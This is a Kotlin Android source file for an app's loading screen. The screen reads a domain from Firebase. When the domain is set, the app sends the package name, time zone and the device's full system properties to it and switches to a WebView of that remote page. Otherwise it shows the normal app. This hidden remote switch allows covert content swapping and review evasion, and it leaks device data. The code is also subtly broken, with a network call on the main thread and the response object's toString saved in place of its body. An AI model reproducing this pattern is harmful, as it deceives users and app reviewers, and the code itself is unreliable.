package com.template

import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.ValueEventListener
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.template.databinding.ActivityLoadingBinding
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import java.util.TimeZone
import java.util.UUID

class LoadingActivity : AppCompatActivity() {

    private lateinit var binding: ActivityLoadingBinding

    private lateinit var database: DatabaseReference

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityLoadingBinding.inflate(layoutInflater)
        setContentView(binding.root)

        database = Firebase.database.reference

        if (networkAvailable()) {

            database.addListenerForSingleValueEvent(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val domainFromFirebase = snapshot.getValue(String::class.java)

                    if (domainFromFirebase.isNullOrEmpty()) {
                        startMainActivity()
                    } else {

                        val url = "$domainFromFirebase/?packageid=$packageName &usserid=${
                            UUID.randomUUID()
                        }&getz=${TimeZone.getDefault().id}" +
                                "&getr=utm_source=google-play&utm_medium=organic"

                        "application/json; charset=utf-8".toMediaType()

                        val client = OkHttpClient()
                        val userAgent = System.getProperties().toString()

                        val request: Request = Request.Builder()
                            .url(url)
                            .header("User-Agent", userAgent)
                            .build()

                        client.newCall(request).execute().use { response ->
                            if (response.isSuccessful) {
                                saveUrlToPreferences(response.body.toString())
                                startWebActivity(url)
                            } else {
                                if (response.code == ERROR) {
                                    startMainActivity()
                                }
                            }
                        }

                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    startMainActivity()
                }
            }
            )
        } else{
            startMainActivity()
        }
    }
private fun startMainActivity() {
    val intent = Intent(this@LoadingActivity, MainActivity::class.java)
    startActivity(intent)
}

    private fun startWebActivity(url:String) {
        val intent = Intent(this@LoadingActivity, WebActivity::class.java)
        intent.putExtra("url", url)
        startActivity(intent)
    }

    private fun saveUrlToPreferences(url: String) {
        val preferences = getSharedPreferences("my_preferences", Context.MODE_PRIVATE)
        val editor = preferences.edit()
        editor.putString("url_key", url)
        editor.apply()
    }

private fun networkAvailable(): Boolean {
    val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
    val networkInfo = connectivityManager.activeNetworkInfo
    return networkInfo != null && networkInfo.isConnected
}
    companion object{

        const val ERROR = 403
    }

}

